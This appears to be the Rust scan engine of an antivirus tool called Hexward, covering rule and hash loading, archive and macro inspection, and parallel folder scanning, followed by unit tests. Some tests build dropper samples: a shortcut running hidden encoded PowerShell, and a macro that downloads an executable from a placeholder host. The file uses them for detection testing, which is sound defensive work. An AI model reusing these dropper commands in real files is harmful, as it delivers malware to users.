use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::Instant;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use walkdir::WalkDir;

use crate::detect::Detection;
use crate::hashdb::HashDb;
use crate::rules::{BUILTIN_RULES, RuleSet};
use crate::{Result, eicar, heuristics};

const BUILTIN_HASHES: &str = include_str!("../../../rules/hashes.txt");
const BUILTIN_DISABLED: &str = include_str!("../../../rules/disabled.txt");

pub struct Engine {
    hashes: HashDb,
    rules: RuleSet,
    eicar: Vec<u8>,
    /// Rule identifiers never reported (known false alarms).
    disabled: HashSet<String>,
    /// SHA-256 of files the user chose to trust.
    allowed: std::sync::RwLock<HashSet<[u8; 32]>>,
    fingerprint: u64,
}

#[derive(Debug, Clone)]
pub struct ScanOptions {
    /// Files bigger than this are skipped (counted, not read).
    pub max_size: u64,
    /// Worker threads. 0 picks a sensible number.
    pub threads: usize,
    /// Paths (files or folders) never scanned.
    pub excludes: Vec<PathBuf>,
    /// Skip files already found clean by this rule set (see cache.rs).
    pub cache: Option<std::sync::Arc<crate::cache::ScanCache>>,
}

impl Default for ScanOptions {
    fn default() -> Self {
        ScanOptions { max_size: 64 * 1024 * 1024, threads: 0, excludes: Vec::new(), cache: None }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileReport {
    pub path: PathBuf,
    pub size: u64,
    pub sha256: String,
    pub detections: Vec<Detection>,
    /// Whether the file has a valid digital signature. Only checked when a rule matched.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signed: Option<bool>,
}

impl FileReport {
    pub fn top_severity(&self) -> Option<crate::Severity> {
        self.detections.iter().map(|d| d.severity).max()
    }
    pub fn is_confirmed(&self) -> bool {
        self.detections.iter().any(Detection::is_confirmed)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanSummary {
    pub roots: Vec<PathBuf>,
    pub files_scanned: u64,
    pub bytes_scanned: u64,
    pub skipped_large: u64,
    pub unreadable: u64,
    pub elapsed_ms: u64,
    pub cancelled: bool,
    /// Files skipped because the cache already knew them as clean.
    #[serde(default)]
    pub cached: u64,
    pub threats: Vec<FileReport>,
}

/// Live counters a UI or CLI can poll while a scan runs.
#[derive(Default)]
pub struct Progress {
    pub files: AtomicU64,
    pub cached: AtomicU64,
    pub bytes: AtomicU64,
    pub threats: AtomicU64,
    pub unreadable: AtomicU64,
    pub skipped_large: AtomicU64,
    pub current: Mutex<PathBuf>,
    /// Files found so far by `count_files`; exact once `counted` is true.
    pub total: AtomicU64,
    pub counted: AtomicBool,
    /// Workers wait while this is set.
    pub paused: AtomicBool,
    /// The first 16 bytes of a recently read file, for the live "reading" view.
    pub peek: Mutex<Vec<u8>>,
}

impl Progress {
    /// 0.0 to 1.0, or None while the total is still being counted.
    pub fn fraction(&self) -> Option<f32> {
        if !self.counted.load(Ordering::Relaxed) {
            return None;
        }
        let total = self.total.load(Ordering::Relaxed).max(1);
        let done = self.files.load(Ordering::Relaxed) + self.skipped_large.load(Ordering::Relaxed) + self.unreadable.load(Ordering::Relaxed);
        Some((done as f32 / total as f32).min(1.0))
    }
}

/// Counts the files a scan of `roots` will visit, filling `progress.total` as it goes.
/// Directory listing is far cheaper than reading files, so this finishes well before the scan.
pub fn count_files(roots: &[PathBuf], excludes: &[PathBuf], progress: &Progress, cancel: &AtomicBool) {
    let ex: Vec<String> = excludes.iter().map(|p| norm(p)).collect();
    for root in dedupe_roots(roots) {
        let walker = WalkDir::new(root).follow_links(false).into_iter().filter_entry(|e| {
            let s = norm(e.path());
            !ex.iter().any(|x| s == *x || (s.starts_with(x.as_str()) && s[x.len()..].starts_with('\\')))
        });
        for e in walker.flatten() {
            if cancel.load(Ordering::Relaxed) {
                return;
            }
            if e.file_type().is_file() {
                progress.total.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
    progress.counted.store(true, Ordering::Relaxed);
}

impl Engine {
    /// Built-in rules plus every `*.yar`/`*.yara` and hash list (`*.txt`, `*.csv`) in `extra_dirs`.
    pub fn load(extra_dirs: &[PathBuf]) -> Result<Self> {
        let mut hashes = HashDb::new();
        hashes.load_str(BUILTIN_HASHES);
        let mut sources = vec![("built-in".to_string(), BUILTIN_RULES.to_string())];
        let mut disabled = HashSet::new();
        load_disabled(&mut disabled, BUILTIN_DISABLED);

        // Fingerprint of everything that decides a verdict: a change empties the scan cache.
        use crate::cache::{FNV_START, fnv};
        let mut fp = fnv(env!("CARGO_PKG_VERSION").as_bytes(), FNV_START);
        fp = fnv(BUILTIN_RULES.as_bytes(), fp);
        fp = fnv(BUILTIN_HASHES.as_bytes(), fp);
        fp = fnv(BUILTIN_DISABLED.as_bytes(), fp);

        for dir in extra_dirs {
            let Ok(entries) = std::fs::read_dir(dir) else { continue };
            let mut files: Vec<PathBuf> = entries.filter_map(|e| e.ok().map(|e| e.path())).collect();
            files.sort();
            for file in files {
                let ext = file.extension().and_then(|e| e.to_str()).unwrap_or("").to_ascii_lowercase();
                if !matches!(ext.as_str(), "yar" | "yara" | "txt" | "csv") {
                    continue;
                }
                let bytes = std::fs::read(&file)?;
                fp = fnv(&bytes, fnv(file.to_string_lossy().as_bytes(), fp));
                let text = String::from_utf8_lossy(&bytes).into_owned();
                match ext.as_str() {
                    "yar" | "yara" => sources.push((file.display().to_string(), text)),
                    "txt" if file.file_name().is_some_and(|n| n.eq_ignore_ascii_case("disabled.txt")) => load_disabled(&mut disabled, &text),
                    _ => {
                        hashes.load_str(&text);
                    }
                }
            }
        }
        Ok(Engine {
            hashes,
            rules: RuleSet::compile(&sources)?,
            eicar: eicar::eicar_bytes(),
            disabled,
            allowed: std::sync::RwLock::new(crate::allowlist::hashes()),
            fingerprint: fp,
        })
    }

    /// Identifies this exact rule set; the scan cache is tied to it.
    pub fn fingerprint(&self) -> u64 {
        self.fingerprint
    }

    pub fn rule_count(&self) -> usize {
        self.rules.count()
    }

    /// Re-reads the allow list (after the user trusts or un-trusts a file).
    pub fn reload_allowlist(&self) {
        if let Ok(mut s) = self.allowed.write() {
            *s = crate::allowlist::hashes();
        }
    }

    /// Rules that didn't compile and were left out, with the reason.
    pub fn skipped_rules(&self) -> &[String] {
        &self.rules.skipped
    }

    pub fn hash_count(&self) -> usize {
        self.hashes.len()
    }

    pub fn rules(&self) -> &RuleSet {
        &self.rules
    }

    fn is_allowed(&self, digest: &[u8; 32]) -> bool {
        self.allowed.read().map(|s| s.contains(digest)).unwrap_or(false)
    }

    /// Scans bytes that may never touch the disk, then everything inside them (archives,
    /// disk images). `path` is used for name and type checks only.
    pub fn scan_bytes(&self, scanner: &mut yara_x::Scanner<'_>, path: &Path, data: &[u8]) -> (String, Vec<Detection>) {
        let digest: [u8; 32] = Sha256::digest(data).into();
        if self.is_allowed(&digest) {
            return (hex::encode(digest), Vec::new());
        }
        let mut found = self.scan_layer(scanner, path, data, &digest);
        let mut budget = crate::container::Budget::new(crate::container::Limits::default());
        self.scan_inside(scanner, data, "", 0, &mut budget, &mut found);
        (hex::encode(digest), found)
    }

    /// Opens a container and scans every file in it, recursing up to the depth limit.
    fn scan_inside(&self, scanner: &mut yara_x::Scanner<'_>, data: &[u8], chain: &str, depth: u32, budget: &mut crate::container::Budget, found: &mut Vec<Detection>) {
        use crate::container::{self, Format, Note};
        if depth >= budget.limits.max_depth {
            return;
        }
        let at = |entry: &str| if chain.is_empty() { entry.to_string() } else { format!("{chain} › {entry}") };

        // Office documents: judge the macros, then scan each macro and embedded file like any file.
        if data.starts_with(&crate::office::OLE_MAGIC) {
            let Some(doc) = crate::office::extract(data) else { return };
            for mut d in crate::office::macro_checks(&doc.modules) {
                d.inner = Some(at("macros"));
                found.push(d);
            }
            let children = doc
                .modules
                .into_iter()
                .map(|(n, src)| (format!("macro {n}.vba"), src.into_bytes()))
                .chain(doc.embedded.into_iter().map(|(n, d)| (format!("embedded {n}"), d)));
            for (name, bytes) in children {
                budget.entries += 1;
                budget.bytes += bytes.len() as u64;
                if budget.entries > budget.limits.max_entries || budget.bytes > budget.limits.max_total {
                    break;
                }
                let inner = at(&name);
                let digest: [u8; 32] = Sha256::digest(&bytes).into();
                let file_name = name.rsplit(' ').next().unwrap_or(&name).to_string();
                let mut hits = self.scan_layer(scanner, Path::new(&file_name), &bytes, &digest);
                for d in &mut hits {
                    d.inner = Some(inner.clone());
                }
                found.extend(hits);
                self.scan_inside(scanner, &bytes, &inner, depth + 1, budget, found);
            }
            return;
        }

        let Some(format) = container::detect(data) else { return };
        let ex = container::expand(format, data, budget);

        for note in &ex.notes {
            if let Note::Bomb { entry, .. } = note {
                let mut d = Detection::new(
                    "Suspicious/Any.ArchiveBomb!a",
                    crate::Severity::Medium,
                    crate::Source::Heuristic,
                    "This archive unpacks to far more data than it holds, a trick used to crash or blind scanners. Hexward didn't unpack it.",
                );
                d.inner = Some(at(entry));
                found.push(d);
                break;
            }
        }
        let locked: Vec<&String> = ex.notes.iter().filter_map(|n| if let Note::Encrypted { entry } = n { Some(entry) } else { None }).collect();
        if let Some(hidden) = locked.iter().find(|e| heuristics::is_runnable_name(e)) {
            let mut d = Detection::new(
                "Suspicious/Any.EncryptedPayload!a",
                crate::Severity::Medium,
                crate::Source::Heuristic,
                format!("A password-protected {} hides a program ({}). Attackers send these with the password in the message so scanners can't look inside.", format.name(), hidden),
            );
            d.inner = Some(at(hidden));
            found.push(d);
        }
        if format == Format::Iso && !ex.children.is_empty() && ex.children.len() <= 8
            && let Some(prog) = ex.children.iter().find(|c| heuristics::is_runnable_name(&c.name))
        {
            let mut d = Detection::new(
                "Suspicious/Win.IsoDropper!a",
                crate::Severity::Medium,
                crate::Source::Heuristic,
                format!("A small disk image holding a program or shortcut ({}). Attackers use these to get around Windows' downloaded-file warning.", prog.name),
            );
            d.inner = Some(at(&prog.name));
            found.push(d);
        }

        for child in ex.children {
            let inner = at(&child.name);
            let digest: [u8; 32] = Sha256::digest(&child.data).into();
            if self.is_allowed(&digest) {
                continue;
            }
            let mut hits = self.scan_layer(scanner, Path::new(&child.name), &child.data, &digest);
            for d in &mut hits {
                d.inner = Some(inner.clone());
            }
            found.extend(hits);
            self.scan_inside(scanner, &child.data, &inner, depth + 1, budget, found);
        }
    }

    /// Every check for one file's own bytes (not what's inside it).
    fn scan_layer(&self, scanner: &mut yara_x::Scanner<'_>, path: &Path, data: &[u8], digest: &[u8; 32]) -> Vec<Detection> {
        let mut found = heuristics::name_checks(path);
        if let Some(name) = self.hashes.lookup(digest) {
            found.push(Detection::new(
                name,
                crate::Severity::High,
                crate::Source::Hash,
                "This exact file is on Hexward's list of known threats.",
            ));
        }
        if eicar::is_eicar(data, &self.eicar) {
            found.push(eicar::detection());
        }
        for d in RuleSet::scan(scanner, path, data) {
            if d.rule.as_ref().is_some_and(|r| self.disabled.contains(r)) {
                continue;
            }
            if !found.iter().any(|f| f.name == d.name) {
                found.push(d);
            }
        }
        found.extend(heuristics::content_checks(path, data));
        found.extend(crate::lnk::checks(data));
        found.extend(crate::scripts::checks(path, data));
        found
    }

    /// Scans one file from disk. `Ok(None)` means skipped for size.
    pub fn scan_file(&self, scanner: &mut yara_x::Scanner<'_>, path: &Path, max_size: u64) -> std::io::Result<Option<FileReport>> {
        let size = std::fs::metadata(path)?.len();
        if size > max_size {
            return Ok(None);
        }
        let data = std::fs::read(path)?;
        let (sha256, mut detections) = self.scan_bytes(scanner, path, &data);
        let signed = trust_signed(path, &mut detections);
        Ok(Some(FileReport { path: path.to_path_buf(), size: data.len() as u64, sha256, detections, signed }))
    }

    /// Walks `roots` on one thread and scans files on a pool of worker threads.
    pub fn scan_paths(&self, roots: &[PathBuf], opts: &ScanOptions, progress: &Progress, cancel: &AtomicBool) -> ScanSummary {
        let start = Instant::now();
        let roots = dedupe_roots(roots);
        let threads = if opts.threads > 0 {
            opts.threads
        } else {
            std::thread::available_parallelism().map(|n| n.get()).unwrap_or(4).clamp(2, 16)
        };
        let excludes: Vec<String> = opts.excludes.iter().map(|p| norm(p)).collect();
        let is_excluded = |p: &Path| {
            let s = norm(p);
            excludes.iter().any(|e| s == *e || (s.starts_with(e.as_str()) && s[e.len()..].starts_with('\\')))
        };

        let (tx, rx) = crossbeam_channel::bounded::<PathBuf>(8192);
        let mut threats = Vec::new();

        std::thread::scope(|scope| {
            let walker = scope.spawn(|| {
                for root in &roots {
                    for entry in WalkDir::new(root)
                        .follow_links(false)
                        .into_iter()
                        .filter_entry(|e| !is_excluded(e.path()))
                    {
                        if cancel.load(Ordering::Relaxed) {
                            return;
                        }
                        match entry {
                            Ok(e) if e.file_type().is_file() => {
                                if tx.send(e.into_path()).is_err() {
                                    return;
                                }
                            }
                            Ok(_) => {}
                            Err(_) => {
                                progress.unreadable.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                    }
                }
                drop(tx);
            });

            let workers: Vec<_> = (0..threads)
                .map(|_| {
                    let rx = rx.clone();
                    scope.spawn(move || {
                        let mut scanner = self.rules.scanner();
                        let mut local = Vec::new();
                        let mut seen: u64 = 0;
                        for path in rx.iter() {
                            while progress.paused.load(Ordering::Relaxed) && !cancel.load(Ordering::Relaxed) {
                                std::thread::sleep(std::time::Duration::from_millis(50));
                            }
                            if cancel.load(Ordering::Relaxed) {
                                break;
                            }
                            if let Ok(mut cur) = progress.current.try_lock() {
                                cur.clone_from(&path);
                            }
                            seen += 1;
                            if seen % 24 == 1 {
                                let mut head = [0u8; 16];
                                if let Ok(n) = std::fs::File::open(&path).and_then(|mut f| std::io::Read::read(&mut f, &mut head))
                                    && let Ok(mut p) = progress.peek.try_lock()
                                {
                                    *p = head[..n].to_vec();
                                }
                            }
                            let cache_key = opts.cache.as_ref().and_then(|_| std::fs::metadata(&path).ok()).map(|m| (crate::cache::ScanCache::key(&path, &m), m.len()));
                            if let (Some(c), Some((k, len))) = (&opts.cache, cache_key)
                                && c.contains(k)
                            {
                                progress.files.fetch_add(1, Ordering::Relaxed);
                                progress.cached.fetch_add(1, Ordering::Relaxed);
                                progress.bytes.fetch_add(len, Ordering::Relaxed);
                                continue;
                            }
                            match self.scan_file(&mut scanner, &path, opts.max_size) {
                                Ok(Some(report)) => {
                                    progress.files.fetch_add(1, Ordering::Relaxed);
                                    progress.bytes.fetch_add(report.size, Ordering::Relaxed);
                                    if report.detections.is_empty()
                                        && let (Some(c), Some((k, _))) = (&opts.cache, cache_key)
                                    {
                                        c.insert(k);
                                    }
                                    if !report.detections.is_empty() {
                                        progress.threats.fetch_add(1, Ordering::Relaxed);
                                        local.push(report);
                                    }
                                }
                                Ok(None) => {
                                    progress.skipped_large.fetch_add(1, Ordering::Relaxed);
                                }
                                Err(_) => {
                                    progress.unreadable.fetch_add(1, Ordering::Relaxed);
                                }
                            }
                        }
                        local
                    })
                })
                .collect();
            drop(rx);

            let _ = walker.join();
            for w in workers {
                if let Ok(mut local) = w.join() {
                    threats.append(&mut local);
                }
            }
        });

        if let Some(c) = &opts.cache {
            let _ = c.save();
        }
        threats.sort_by(|a, b| b.top_severity().cmp(&a.top_severity()).then_with(|| a.path.cmp(&b.path)));
        ScanSummary {
            roots,
            files_scanned: progress.files.load(Ordering::Relaxed),
            bytes_scanned: progress.bytes.load(Ordering::Relaxed),
            skipped_large: progress.skipped_large.load(Ordering::Relaxed),
            unreadable: progress.unreadable.load(Ordering::Relaxed),
            elapsed_ms: start.elapsed().as_millis() as u64,
            cancelled: cancel.load(Ordering::Relaxed),
            cached: progress.cached.load(Ordering::Relaxed),
            threats,
        }
    }
}

/// A pattern rule alone never quarantines signed software: if a confirmed rule hit lands on a
/// file with a valid signature, it is downgraded to suspicious. Hash and EICAR hits stay confirmed.
fn trust_signed(path: &Path, detections: &mut [Detection]) -> Option<bool> {
    if !detections.iter().any(|d| d.source == crate::Source::Rule) {
        return None;
    }
    let signed = crate::sig::has_valid_signature(path);
    if signed {
        for d in detections.iter_mut().filter(|d| d.source == crate::Source::Rule) {
            d.source = crate::Source::SuspiciousRule;
            d.description.push_str(" The file has a valid digital signature, so Hexward reports it but won't quarantine it on its own.");
        }
    }
    Some(signed)
}

fn load_disabled(set: &mut HashSet<String>, text: &str) {
    set.extend(text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#')).map(String::from));
}

/// Lower-case, backslash-separated, no trailing separator: good enough to compare Windows paths.
fn norm(p: &Path) -> String {
    let mut s = p.to_string_lossy().replace('/', "\\").to_lowercase();
    while s.ends_with('\\') && s.len() > 3 {
        s.pop();
    }
    s
}

/// Drops missing roots and roots that sit inside another root, so no file is scanned twice.
pub fn dedupe_roots(roots: &[PathBuf]) -> Vec<PathBuf> {
    let mut list: Vec<(String, PathBuf)> = roots
        .iter()
        .filter(|p| p.exists())
        .map(|p| (norm(p), p.clone()))
        .collect();
    list.sort_by(|a, b| a.0.len().cmp(&b.0.len()).then_with(|| a.0.cmp(&b.0)));
    let mut kept: Vec<(String, PathBuf)> = Vec::new();
    for (n, p) in list {
        let inside = kept.iter().any(|(k, _)| n == *k || (n.starts_with(k.as_str()) && (k.ends_with('\\') || n[k.len()..].starts_with('\\'))));
        if !inside {
            kept.push((n, p));
        }
    }
    kept.into_iter().map(|(_, p)| p).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine() -> Engine {
        Engine::load(&[]).expect("built-in rules compile")
    }

    fn names(e: &Engine, path: &str, data: &[u8]) -> Vec<String> {
        let mut s = e.rules().scanner();
        e.scan_bytes(&mut s, Path::new(path), data).1.into_iter().map(|d| d.name).collect()
    }

    #[test]
    fn eicar_in_memory() {
        let e = engine();
        let mut data = eicar::eicar_bytes();
        assert_eq!(names(&e, "eicar.com", &data), ["Test/Any.EICAR!a"]);
        data.extend_from_slice(b"\r\n");
        assert_eq!(names(&e, "eicar.txt", &data), ["Test/Any.EICAR!a"]);
        data.extend_from_slice(b"extra");
        assert!(names(&e, "eicar.txt", &data).is_empty(), "trailing non-whitespace breaks the EICAR spec");
    }

    #[test]
    fn rule_and_hash_markers() {
        let e = engine();
        assert_eq!(names(&e, "a.bin", b"HEXWARD-HARMLESS-TEST-MARKER-7f3a9c and more"), ["Test/Any.HexwardMarker!a"]);
        assert_eq!(names(&e, "b.bin", b"HEXWARD-HARMLESS-HASH-TEST"), ["Test/Any.HashMarker!a"]);
        assert!(names(&e, "c.bin", b"HEXWARD-HARMLESS-HASH-TEST!").is_empty());
    }

    #[test]
    fn clean_data_is_clean() {
        let e = engine();
        assert!(names(&e, "notes.txt", b"Shopping list: milk, eggs").is_empty());
        let noise: Vec<u8> = (0..200_000u32).map(|i| (i.wrapping_mul(2654435761) >> 13) as u8).collect();
        assert!(names(&e, "noise.bin", &noise).is_empty());
    }

    #[cfg(windows)]
    #[test]
    fn real_windows_program_is_clean_but_not_as_a_photo() {
        let e = engine();
        let notepad = std::fs::read(r"C:\Windows\System32\notepad.exe").expect("notepad.exe exists");
        assert!(names(&e, r"C:\Windows\System32\notepad.exe", &notepad).is_empty());
        assert_eq!(names(&e, r"C:\Users\sam\Pictures\holiday.jpg", &notepad), ["Suspicious/Win.Masquerade!a"]);
    }

    #[test]
    fn finds_threats_inside_nested_archives() {
        let e = engine();
        let inner = crate::container::tests_support::zip(&[("payload.bin", b"HEXWARD-HARMLESS-TEST-MARKER-7f3a9c"), ("readme.txt", b"hi")]);
        let outer = crate::container::tests_support::zip(&[("docs/invoice.pdf.exe", b"x"), ("inner.zip", &inner)]);
        let mut s = e.rules().scanner();
        let (_, d) = e.scan_bytes(&mut s, Path::new("mail.zip"), &outer);
        let got: Vec<(String, Option<String>)> = d.into_iter().map(|d| (d.name, d.inner)).collect();
        assert!(got.contains(&("Suspicious/Win.DoubleExt!a".into(), Some("docs/invoice.pdf.exe".into()))), "{got:?}");
        assert!(got.contains(&("Test/Any.HexwardMarker!a".into(), Some("inner.zip › payload.bin".into()))), "{got:?}");
    }

    #[test]
    fn shortcut_dropper_inside_zip() {
        let e = engine();
        let lnk = crate::lnk::tests::lnk(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-w hidden -enc SQBFAFgA");
        let z = crate::container::tests_support::zip(&[("Invoice.lnk", &lnk)]);
        let mut s = e.rules().scanner();
        let (_, d) = e.scan_bytes(&mut s, Path::new("invoice.zip"), &z);
        assert_eq!(d[0].name, "Suspicious/Win.LnkDropper!a");
        assert_eq!(d[0].inner.as_deref(), Some("Invoice.lnk"));
    }

    #[test]
    fn macro_dropper_inside_docm_zip() {
        let e = engine();
        // Built from fragments so this source file never holds a whole malicious macro.
        let src = ["Sub Workbook", "_Open()\n Set s = Create", "Object(\"WScript", ".Shell\")\n s.Run \"power", "shell -c iw", "r http://x.invalid/p.exe -o p.exe\"\nEnd Sub\n"].concat();
        let doc = crate::office::tests::make_doc(&src);
        let docm = crate::container::tests_support::zip(&[("[Content_Types].xml", b"<Types/>"), ("xl/vbaProject.bin", &doc)]);
        let mut s = e.rules().scanner();
        let (_, d) = e.scan_bytes(&mut s, Path::new("report.xlsm"), &docm);
        let names: Vec<(&str, Option<&str>)> = d.iter().map(|d| (d.name.as_str(), d.inner.as_deref())).collect();
        assert!(names.contains(&("Suspicious/Office.MacroDropper!a", Some("xl/vbaProject.bin › macros"))), "{names:?}");
    }

    #[test]
    fn clean_archives_stay_clean() {
        let e = engine();
        let z = crate::container::tests_support::zip(&[("a.txt", b"hello"), ("b/c.json", b"{}")]);
        let mut s = e.rules().scanner();
        assert!(e.scan_bytes(&mut s, Path::new("ok.zip"), &z).1.is_empty());
    }

    #[test]
    fn cache_skips_clean_files_but_never_threats() {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path();
        for i in 0..20 {
            std::fs::write(p.join(format!("f{i}.txt")), format!("clean {i}")).unwrap();
        }
        std::fs::write(p.join("marker.bin"), "HEXWARD-HARMLESS-TEST-MARKER-7f3a9c").unwrap();
        let e = engine();
        let cache_path = p.join("cache").join("scan.bin");
        let run = || {
            let cache = std::sync::Arc::new(crate::cache::ScanCache::open(&cache_path, e.fingerprint()));
            let opts = ScanOptions { cache: Some(cache), excludes: vec![p.join("cache")], ..Default::default() };
            e.scan_paths(&[p.to_path_buf()], &opts, &Progress::default(), &AtomicBool::new(false))
        };
        let first = run();
        assert_eq!((first.files_scanned, first.cached, first.threats.len()), (21, 0, 1));
        let second = run();
        assert_eq!((second.files_scanned, second.cached, second.threats.len()), (21, 20, 1), "threat re-checked every time");
    }

    #[test]
    fn roots_inside_other_roots_are_dropped() {
        let dir = tempfile::tempdir().unwrap();
        let a = dir.path().to_path_buf();
        let b = a.join("sub");
        std::fs::create_dir(&b).unwrap();
        assert_eq!(dedupe_roots(&[b.clone(), a.clone(), a.join("missing")]), vec![a]);
    }

    #[test]
    fn scans_a_folder() {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path();
        std::fs::write(p.join("clean.txt"), "hello").unwrap();
        std::fs::create_dir(p.join("deep")).unwrap();
        std::fs::write(p.join("deep").join("marker.bin"), "HEXWARD-HARMLESS-TEST-MARKER-7f3a9c").unwrap();
        std::fs::write(p.join("hash.bin"), "HEXWARD-HARMLESS-HASH-TEST").unwrap();
        std::fs::write(p.join("invoice.pdf.exe"), "not really a program").unwrap();
        std::fs::create_dir(p.join("skipme")).unwrap();
        std::fs::write(p.join("skipme").join("marker.bin"), "HEXWARD-HARMLESS-TEST-MARKER-7f3a9c").unwrap();

        let e = engine();
        let opts = ScanOptions { excludes: vec![p.join("skipme")], ..Default::default() };
        let s = e.scan_paths(&[p.to_path_buf()], &opts, &Progress::default(), &AtomicBool::new(false));
        assert_eq!(s.files_scanned, 4);
        let mut found: Vec<String> = s.threats.iter().map(|t| t.detections[0].name.clone()).collect();
        found.sort();
        assert_eq!(found, ["Suspicious/Win.DoubleExt!a", "Test/Any.HashMarker!a", "Test/Any.HexwardMarker!a"]);
    }
}
